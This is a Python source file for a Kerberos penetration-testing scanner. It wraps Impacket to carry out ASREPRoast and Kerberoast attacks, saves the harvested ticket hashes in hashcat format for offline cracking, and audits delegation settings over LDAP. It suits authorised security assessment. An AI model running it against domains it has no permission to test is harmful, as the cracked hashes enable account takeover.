"""Kerberos Scanner — ASREPRoast, Kerberoast, Delegation Audit.

Read/audit only. Outputs hashcat-formatted hashes plus structured JSON reports.
No lateral movement or exploitation code.

Sources:
- Impacket (GetNPUsers.py / GetUserSPNs.py wrappers)
- THM labs: Kerberoasting, Attacking Kerberos, AD Kerberos Advanced
"""

from __future__ import annotations

import logging
import os
import subprocess
import sys
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Enums / data models
# ---------------------------------------------------------------------------

class ScanMode(str, Enum):
    ASREPROAST = "asreproast"
    KERBEROAST = "kerberoast"
    DELEGATION = "delegation"
    ALL = "all"


class HashcatMode(str, Enum):
    ASREP = "18200"
    KERBEROS_RC4 = "13100"
    KERBEROS_AES128 = "19700"
    KERBEROS_AES256 = "19800"


class DelegationType(str, Enum):
    UNCONSTRAINED = "unconstrained"
    CONSTRAINED = "constrained"
    RESOURCE_CONSTRAINED = "resource_constrained"


@dataclass
class KerberoastHash:
    """Single Kerberoast / ASREP hash entry."""
    username: str
    spn: str = ""
    hash: str = ""
    encryption: str = ""          # RC4-HMAC, AES128, AES256
    hashcat_mode: str = ""
    hostname: str = ""
    timestamp: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.username,
            "spn": self.spn,
            "hash": self.hash,
            "encryption": self.encryption,
            "hashcat_mode": self.hashcat_mode,
            "hostname": self.hostname,
            "timestamp": self.timestamp,
        }


@dataclass
class DelegationFinding:
    """Delegation audit finding."""
    computer_name: str
    delegation_type: DelegationType
    allowed_to_delegate_to: List[str] = field(default_factory=list)
    user_account_control: int = 0
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "computer_name": self.computer_name,
            "delegation_type": self.delegation_type.value,
            "allowed_to_delegate_to": self.allowed_to_delegate_to,
            "user_account_control": self.user_account_control,
            "details": self.details,
        }


@dataclass
class KerberosScanResult:
    """Complete scan results."""
    domain: str
    dc_ip: str
    mode: str
    asrep_hashes: List[KerberoastHash] = field(default_factory=list)
    kerberoast_hashes: List[KerberoastHash] = field(default_factory=list)
    delegation_findings: List[DelegationFinding] = field(default_factory=list)
    scan_errors: List[str] = field(default_factory=list)
    scan_metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "mode": self.mode,
            "asrep_hashes": [h.to_dict() for h in self.asrep_hashes],
            "kerberoast_hashes": [h.to_dict() for h in self.kerberoast_hashes],
            "delegation_findings": [d.to_dict() for d in self.delegation_findings],
            "scan_errors": self.scan_errors,
            "scan_metadata": self.scan_metadata,
        }


# ---------------------------------------------------------------------------
# Configuration loader
# ---------------------------------------------------------------------------

DEFAULT_CONFIG_PATHS = [
    Path("~/pentest/config/api_keys.conf").expanduser(),
    Path("~/pentest/config/kerberos.conf").expanduser(),
    Path("./config.yaml"),
]


def _load_config(config_path: Optional[str] = None) -> Dict[str, Any]:
    """Load kerberos scanner config from YAML or env vars."""
    import yaml

    search_paths: List[Path] = []
    if config_path:
        search_paths = [Path(config_path)]
    else:
        search_paths = DEFAULT_CONFIG_PATHS

    for p in search_paths:
        if p.is_file():
            try:
                with open(p) as fh:
                    data = yaml.safe_load(fh) or {}
                # Support nested kerberos_scanner block or flat keys
                kconf = data.get("kerberos_scanner", data)
                logger.info("Loaded config from %s", p)
                return kconf
            except Exception as exc:
                logger.debug("Could not read %s: %s", p, exc)

    # Fallback: environment variables
    env_config: Dict[str, Any] = {}
    env_keys = (
        "KERB_DOMAIN", "KERB_DC_IP", "KERB_USERNAME", "KERB_PASSWORD",
        "KERB_CCACHE", "KERB_USER_FILE", "KERB_OUTPUT_DIR",
    )
    for key in env_keys:
        val = os.environ.get(key)
        if val:
            env_config[key.lower()] = val

    if env_config:
        logger.info("Loaded config from environment variables")
    return env_config


# ---------------------------------------------------------------------------
# Impacket availability check
# ---------------------------------------------------------------------------

def impacket_available() -> bool:
    try:
        subprocess.run(
            ["impacket-GetNPUsers.py", "-h"],
            capture_output=True,
            check=False,
            timeout=10,
        )
        return True
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


# ---------------------------------------------------------------------------
# Core scanner
# ---------------------------------------------------------------------------

class KerberosScanner:
    """Production-ready Kerberos audit scanner (read-only).

    Features
    - ASREPRoast scanning (hashcat mode 18200)
    - Kerberoast scanning (hashcat modes 13100 / 19700 / 19800)
    - Delegation audit (unconstrained / constrained / RBCD)
    - JSON + terminal table output
    """

    def __init__(
        self,
        config_path: Optional[str] = None,
        output_dir: Optional[str] = None,
        log_dir: str = "~/pentest/logs",
    ) -> None:
        self.config = _load_config(config_path)

        # Resolve credentials from nested or flat config keys
        kconf = self.config.get("kerberos_scanner", self.config) if isinstance(self.config, dict) else self.config
        self.domain: str = str(kconf.get("domain", kconf.get("kerberos_domain", "")))
        self.dc_ip: str = str(kconf.get("dc_ip", ""))
        self.username: str = str(kconf.get("username", kconf.get("kerberos_username", "")))
        self.password: str = str(kconf.get("password", kconf.get("kerberos_password", "")))
        self.ccache: str = str(kconf.get("ccache", kconf.get("kerberos_ccache", "")))
        self.user_file: str = str(kconf.get("user_file", kconf.get("kerberos_user_file", "")))

        if output_dir:
            self.output_dir = Path(output_dir)
        else:
            raw_output = kconf.get("output_dir", "~/pentest/results/kerberos")
            self.output_dir = Path(raw_output).expanduser()
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Logging
        log_path = Path(log_dir).expanduser()
        log_path.mkdir(parents=True, exist_ok=True)
        self._setup_logger(log_path / "kerberos_scanner.log")

        self._impacket_available: Optional[bool] = None
        self._errors: List[str] = []

    # ------------------------------------------------------------------
    # Logging
    # ------------------------------------------------------------------

    def _setup_logger(self, logfile: Path) -> None:
        fmt = logging.Formatter(
            "%(asctime)s | %(levelname)-8s | %(name)s | %(message)s"
        )
        fh = logging.FileHandler(logfile)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(fmt)

        sh = logging.StreamHandler(sys.stderr)
        sh.setLevel(logging.INFO)
        sh.setFormatter(fmt)

        root = logging.getLogger("kerberos_scanner")
        root.setLevel(logging.DEBUG)
        root.addHandler(fh)
        root.addHandler(sh)
        root.propagate = False

        logger.addHandler(fh)
        logger.addHandler(sh)
        logger.setLevel(logging.DEBUG)

    # ------------------------------------------------------------------
    # Impacket helpers
    # ------------------------------------------------------------------

    def _check_impacket(self) -> bool:
        if self._impacket_available is None:
            self._impacket_available = impacket_available()
        if not self._impacket_available:
            self._add_error(
                "Impacket is not installed. Install with: "
                "pip install impacket or 'apt install python3-impacket'"
            )
        return bool(self._impacket_available)

    def _add_error(self, msg: str) -> None:
        logger.error(msg)
        self._errors.append(msg)

    def _run_impacket(
        self,
        tool: str,
        args: List[str],
        timeout: int = 120,
    ) -> subprocess.CompletedProcess:
        """Run an Impacket CLI tool with safe argument passing (no shell=True)."""
        cmd = [tool] + args
        logger.debug("Running: %s", " ".join(cmd))
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
            return result
        except subprocess.TimeoutExpired:
            self._add_error(f"Command timed out after {timeout}s: {' '.join(cmd)}")
            return subprocess.CompletedProcess(cmd, -1, "", "timeout")
        except Exception as exc:
            self._add_error(f"Command failed: {exc}")
            return subprocess.CompletedProcess(cmd, -1, "", str(exc))

    # ------------------------------------------------------------------
    # ASREPRoast
    # ------------------------------------------------------------------

    def scan_asreproast(
        self,
        user_file: Optional[str] = None,
        output_file: Optional[str] = None,
        format_: str = "hashcat",
    ) -> KerberosScanResult:
        """Scan for ASREPRoastable accounts using Impacket GetNPUsers.

        Returns KerberosScanResult with AS-REP hashes in hashcat mode 18200 format.
        """
        result = KerberosScanResult(
            domain=self.domain, dc_ip=self.dc_ip, mode=ScanMode.ASREPROAST.value
        )
        self._errors = []

        if not self.domain:
            self._add_error(
                "Domain not configured. Set in config or KERB_DOMAIN env var."
            )
            return result

        if not self._check_impacket():
            return result

        uf = user_file or self.user_file
        output_path = Path(output_file) if output_file else (
            self.output_dir / f"asrep_{self.domain.replace('.','_')}.txt"
        )

        args = self._build_impacket_args()
        if self.ccache:
            args += ["-no-pass"]
        else:
            if self.username and self.password:
                args += [f"{self.username}@{self.domain}", self.password]

        if uf:
            args += ["-usersfile", uf]
        else:
            args += ["-all"]

        args += ["-request", "-format", format_, "-outputfile", str(output_path)]
        if self.dc_ip:
            args += ["-dc-ip", self.dc_ip]

        proc = self._run_impacket("impacket-GetNPUsers.py", args)
        # Impacket returns 1 when no users found — treat as OK
        if proc.returncode not in (0, 1):
            self._add_error(
                f"GetNPUsers failed (rc={proc.returncode}): "
                f"{proc.stderr[:500]}"
            )

        hashes = self._parse_asrep_output(output_path)
        result.asrep_hashes = hashes
        result.scan_errors = list(self._errors)
        result.scan_metadata = {
            "output_file": str(output_path),
            "hashcat_mode": HashcatMode.ASREP.value,
            "total_users_with_asrep": len(hashes),
            "impacket_tool": "GetNPUsers.py",
        }
        logger.info("ASREPRoast complete: %d hashes found", len(hashes))
        return result

    # ------------------------------------------------------------------
    # Kerberoast
    # ------------------------------------------------------------------

    def scan_kerberoast(
        self,
        output_file: Optional[str] = None,
        format_: str = "hashcat",
    ) -> KerberosScanResult:
        """Scan for Kerberoastable accounts using Impacket GetUserSPNs.

        Requests TGS tickets and outputs hashes for offline cracking:
        - RC4-HMAC → hashcat mode 13100
        - AES128    → hashcat mode 19700
        - AES256    → hashcat mode 19800
        """
        result = KerberosScanResult(
            domain=self.domain, dc_ip=self.dc_ip, mode=ScanMode.KERBEROAST.value
        )
        self._errors = []

        if not self.domain:
            self._add_error("Domain not configured.")
            return result

        if not self._check_impacket():
            return result

        output_path = Path(output_file) if output_file else (
            self.output_dir / f"kerberoast_{self.domain.replace('.','_')}.txt"
        )

        args = self._build_impacket_args()
        if self.ccache:
            args += ["-no-pass"]
        else:
            if self.username and self.password:
                args += [f"{self.username}@{self.domain}", self.password]

        args += ["-request", "-format", format_, "-outputfile", str(output_path)]
        if self.dc_ip:
            args += ["-dc-ip", self.dc_ip]

        proc = self._run_impacket("impacket-GetUserSPNs.py", args)
        if proc.returncode not in (0, 1):
            self._add_error(
                f"GetUserSPNs failed (rc={proc.returncode}): "
                f"{proc.stderr[:500]}"
            )

        hashes = self._parse_kerberoast_output(output_path)
        result.kerberoast_hashes = hashes
        result.scan_errors = list(self._errors)
        result.scan_metadata = {
            "output_file": str(output_path),
            "hashcat_modes": {
                "rc4": HashcatMode.KERBEROS_RC4.value,
                "aes128": HashcatMode.KERBEROS_AES128.value,
                "aes256": HashcatMode.KERBEROS_AES256.value,
            },
            "total_spns_found": len(hashes),
            "impacket_tool": "GetUserSPNs.py",
        }
        logger.info("Kerberoast complete: %d SPNs found", len(hashes))
        return result

    # ------------------------------------------------------------------
    # Delegation audit (LDAP via ldap3)
    # ------------------------------------------------------------------

    def scan_delegation(self) -> KerberosScanResult:
        """Audit computers for delegation misconfigurations via LDAP."""
        result = KerberosScanResult(
            domain=self.domain, dc_ip=self.dc_ip, mode=ScanMode.DELEGATION.value
        )
        self._errors = []

        # userAccountControl flags
        FLAG_UNCONSTRAINED = 0x80000
        FLAG_CONSTRAINED = 0x1000000

        try:
            from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
        except ImportError:
            self._add_error(
                "ldap3 not installed. Install with: pip install ldap3"
            )
            result.scan_errors = list(self._errors)
            return result

        if not self.dc_ip:
            self._add_error("DC IP required for delegation scan")
            result.scan_errors = list(self._errors)
            return result

        creds_provided = any([
            self.username, self.password, self.ccache,
        ])
        if not creds_provided:
            self._add_error(
                "Credentials or ccache required for delegation scan"
            )
            result.scan_errors = list(self._errors)
            return result

        conn: Any = None
        total_scanned = 0
        try:
            server = Server(self.dc_ip, get_info=ALL, connect_timeout=15)
            if self.ccache:
                # Use GSSAPI / ccache authentication
                try:
                    from ldap3 import SASL
                    conn = Connection(
                        server,
                        authentication=SASL,
                        sasl_mechanism="GSS-SPNEGO",
                    )
                    conn.open()
                    conn.bind()
                except Exception as exc:
                    self._add_error(f"CCache bind failed: {exc}")
                    result.scan_errors = list(self._errors)
                    return result
            else:
                user = self.username or ""
                conn = Connection(
                    server,
                    user=user if "@" in user else f"{user}@{self.domain}",
                    password=self.password or "",
                    authentication=NTLM,
                    auto_bind=True,
                )

            if not conn or not conn.bound:
                self._add_error("LDAP bind failed")
                result.scan_errors = list(self._errors)
                return result

            search_base = ",".join(f"DC={p}" for p in self.domain.split("."))
            search_filter = (
                "(&(objectClass=computer)"
                "(|(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                "(userAccountControl:1.2.840.113556.1.4.803:=16777216)))"
            )
            attrs = [
                "cn", "dNSHostName", "userAccountControl",
                "msDS-AllowedToDelegateTo",
                "msDS-AllowedToActOnBehalfOfOtherIdentity",
            ]

            conn.search(
                search_base=search_base,
                search_filter=search_filter,
                search_scope=SUBTREE,
                attributes=attrs,
                paged_size=1000,
            )
            total_scanned = len(conn.entries)

            for entry in conn.entries:
                cn = str(entry.cn.value) if entry.cn else "Unknown"
                dns = cn
                if hasattr(entry, "dNSHostName") and entry.dNSHostName.value:
                    dns = str(entry.dNSHostName.value)

                uac = 0
                if hasattr(entry, "userAccountControl") and entry.userAccountControl.value:
                    uac = int(entry.userAccountControl.value)

                allowed_to: List[str] = []
                if (hasattr(entry, "msDS-AllowedToDelegateTo")
                        and entry["msDS-AllowedToDelegateTo"].value):
                    raw = entry["msDS-AllowedToDelegateTo"].value
                    allowed_to = raw if isinstance(raw, list) else [str(raw)]

                if uac & FLAG_UNCONSTRAINED:
                    result.delegation_findings.append(DelegationFinding(
                        computer_name=dns,
                        delegation_type=DelegationType.UNCONSTRAINED,
                        allowed_to_delegate_to=allowed_to,
                        user_account_control=uac,
                    ))
                elif uac & FLAG_CONSTRAINED or allowed_to:
                    dtype = (
                        DelegationType.RESOURCE_CONSTRAINED
                        if allowed_to
                        else DelegationType.CONSTRAINED
                    )
                    result.delegation_findings.append(DelegationFinding(
                        computer_name=dns,
                        delegation_type=dtype,
                        allowed_to_delegate_to=allowed_to,
                        user_account_control=uac,
                    ))

            if conn:
                conn.unbind()

        except Exception as exc:
            self._add_error(f"Delegation scan failed: {exc}")
        finally:
            if conn and conn.bound:
                try:
                    conn.unbind()
                except Exception:
                    pass

        result.scan_errors = list(self._errors)
        result.scan_metadata = {
            "total_computers_scanned": total_scanned,
            "total_delegation_findings": len(result.delegation_findings),
        }
        logger.info(
            "Delegation audit complete: %d findings from %d computers",
            len(result.delegation_findings),
            total_scanned,
        )
        return result

    # ------------------------------------------------------------------
    # Main entry point
    # ------------------------------------------------------------------

    def scan(
        self,
        mode: ScanMode = ScanMode.ALL,
    ) -> KerberosScanResult:
        """Run the requested scan mode(s)."""
        combined = KerberosScanResult(
            domain=self.domain,
            dc_ip=self.dc_ip,
            mode="all",
        )

        modes = [mode] if mode != ScanMode.ALL else [
            ScanMode.ASREPROAST,
            ScanMode.KERBEROAST,
            ScanMode.DELEGATION,
        ]

        for m in modes:
            if m == ScanMode.ASREPROAST:
                r = self.scan_asreproast()
                combined.asrep_hashes = r.asrep_hashes
                combined.scan_errors.extend(r.scan_errors)
            elif m == ScanMode.KERBEROAST:
                r = self.scan_kerberoast()
                combined.kerberoast_hashes = r.kerberoast_hashes
                combined.scan_errors.extend(r.scan_errors)
            elif m == ScanMode.DELEGATION:
                r = self.scan_delegation()
                combined.delegation_findings = r.delegation_findings
                combined.scan_errors.extend(r.scan_errors)

        combined.scan_metadata = {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "username": (self.username[:3] + "***") if len(self.username) > 3 else self.username,
            "total_asrep": len(combined.asrep_hashes),
            "total_kerberoast": len(combined.kerberoast_hashes),
            "total_delegation": len(combined.delegation_findings),
            "errors": len(combined.scan_errors),
        }
        return combined

    # ------------------------------------------------------------------
    # Output formatters
    # ------------------------------------------------------------------

    def to_json(
        self,
        result: KerberosScanResult,
        output_file: Optional[str] = None,
    ) -> str:
        """Serialise result to JSON, optionally writing to file."""
        import json
        payload = result.to_dict()
        text = json.dumps(payload, indent=2, default=str)
        if output_file:
            Path(output_file).write_text(text)
            logger.info("JSON report written to %s", output_file)
        return text

    def to_table(self, result: KerberosScanResult) -> str:
        """Render a human-readable terminal table string."""
        lines: List[str] = []
        lines.append("=" * 72)
        lines.append(
            f" KERBEROS SCAN: {result.domain}  |  DC: {result.dc_ip}"
        )
        lines.append("=" * 72)

        # ASREP
        lines.append(
            f"\n[ASREPRoast] {len(result.asrep_hashes)} accounts (mode 18200)"
        )
        lines.append(f"{'User':<30} {'Hash':<32} {'Encryption'}")
        lines.append("-" * 72)
        for h in result.asrep_hashes:
            lines.append(
                f"{h.username:<30} {h.hash[:32]:<32} {h.encryption}"
            )

        # Kerberoast
        lines.append(
            f"\n[Kerberoast] {len(result.kerberoast_hashes)} service accounts"
        )
        lines.append(
            f"{'User':<20} {'SPN':<30} {'Mode':<8} {'Encryption'}"
        )
        lines.append("-" * 72)
        for h in result.kerberoast_hashes:
            lines.append(
                f"{h.username:<20} {h.spn[:30]:<30} "
                f"{h.hashcat_mode:<8} {h.encryption}"
            )

        # Delegation
        lines.append(
            f"\n[Delegation] {len(result.delegation_findings)} findings"
        )
        lines.append(
            f"{'Computer':<35} {'Type':<25} {'Allowed To Delegate'}"
        )
        lines.append("-" * 72)
        for d in result.delegation_findings:
            allowed = ", ".join(d.allowed_to_delegate_to[:2])
            lines.append(
                f"{d.computer_name:<35} {d.delegation_type.value:<25} {allowed}"
            )

        # Errors
        if result.scan_errors:
            lines.append(f"\n[Errors] {len(result.scan_errors)}")
            for e in result.scan_errors:
                lines.append(f"  ! {e}")

        lines.append("")
        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _build_impacket_args(self) -> List[str]:
        args: List[str] = []
        if self.ccache:
            args += ["-k", "-no-pass"]
            if "KRB5CCNAME" not in os.environ and self.ccache:
                os.environ["KRB5CCNAME"] = str(self.ccache)
        return args

    def _parse_asrep_output(self, path: Path) -> List[KerberoastHash]:
        hashes: List[KerberoastHash] = []
        if not path.exists():
            logger.debug("ASREP output not found: %s", path)
            return hashes

        text = path.read_text(errors="replace")
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                if line.startswith("$krb5asrep$"):
                    parts = line.split("$")
                    if len(parts) >= 4 and parts[2]:
                        user = parts[2].split("@")[0]
                        hashes.append(KerberoastHash(
                            username=user,
                            hash=line,
                            encryption="AS-REP",
                            hashcat_mode=HashcatMode.ASREP.value,
                        ))
                else:
                    if ":" in line:
                        user, _ = line.split(":", 1)
                        hashes.append(KerberoastHash(
                            username=user.strip(),
                            hash=line,
                            encryption="AS-REP",
                            hashcat_mode=HashcatMode.ASREP.value,
                        ))
            except Exception as exc:
                logger.debug(
                    "Parse ASREP line error: %s — %s", exc, line
                )
        return hashes

    def _parse_kerberoast_output(self, path: Path) -> List[KerberoastHash]:
        hashes: List[KerberoastHash] = []
        if not path.exists():
            return hashes

        text = path.read_text(errors="replace")
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                if line.startswith("$krb5tgs$"):
                    parts = line.split("$")
                    enc_type = "RC4-HMAC"
                    mode = HashcatMode.KERBEROS_RC4.value
                    if len(parts) > 2:
                        enc_info = parts[2]
                        if "18" in enc_info:
                            mode = HashcatMode.KERBEROS_AES256.value
                            enc_type = "AES256"
                        elif "17" in enc_info:
                            mode = HashcatMode.KERBEROS_AES128.value
                            enc_type = "AES128"
                    username = parts[3] if len(parts) > 3 else "unknown"
                    hashes.append(KerberoastHash(
                        username=username,
                        spn="",
                        hash=line,
                        encryption=enc_type,
                        hashcat_mode=mode,
                    ))
                else:
                    if ":" in line:
                        segments = line.split(":")
                        username = segments[0].strip()
                        spn = segments[1].strip() if len(segments) > 1 else ""
                        hashes.append(KerberoastHash(
                            username=username,
                            spn=spn,
                            hash=line,
                            encryption="unknown",
                            hashcat_mode=HashcatMode.KERBEROS_RC4.value,
                        ))
            except Exception as exc:
                logger.debug(
                    "Parse kerberoast line error: %s — %s", exc, line
                )
        return hashes


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """CLI: python -m src.kerberos_scanner [mode] [--config path]"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Kerberos Scanner — ASREPRoast, Kerberoast, Delegation Audit"
    )
    parser.add_argument(
        "mode", nargs="?", default="all",
        choices=[m.value for m in ScanMode],
        help="Scan mode (default: all)",
    )
    parser.add_argument("--config", help="Path to config.yaml or api_keys.conf")
    parser.add_argument("--output", help="Output directory for results")
    parser.add_argument("--dc-ip", help="Domain Controller IP (overrides config)")
    parser.add_argument("--domain", help="Domain (overrides config)")
    parser.add_argument("--username", help="Username (overrides config)")
    parser.add_argument("--password", help="Password (overrides config)")
    parser.add_argument("--ccache", help="Path to Kerberos ccache file")
    parser.add_argument("--user-file", help="File with user list for ASREPRoast")
    parser.add_argument("--json-out", help="Write JSON report to this path")
    parser.add_argument(
        "--impacket-tool-path",
        default="impacket-",
        help="Prefix for impacket tools (default: impacket-)",
    )
    args = parser.parse_args()

    scanner = KerberosScanner(
        config_path=args.config,
        output_dir=args.output,
    )

    # CLI overrides take precedence
    if args.dc_ip:
        scanner.dc_ip = args.dc_ip
    if args.domain:
        scanner.domain = args.domain
    if args.username:
        scanner.username = args.username
    if args.password:
        scanner.password = args.password
    if args.ccache:
        scanner.ccache = args.ccache
    if args.user_file:
        scanner.user_file = args.user_file

    mode = ScanMode(args.mode)
    result = scanner.scan(mode)

    print(scanner.to_table(result))

    json_out = args.json_out
    if not json_out:
        json_out = str(
            scanner.output_dir / f"scan_{result.domain.replace('.','_')}_{mode.value}.json"
        )
    print(scanner.to_json(result, json_out))

    sys.exit(0 if not result.scan_errors else 1)


if __name__ == "__main__":
    main()
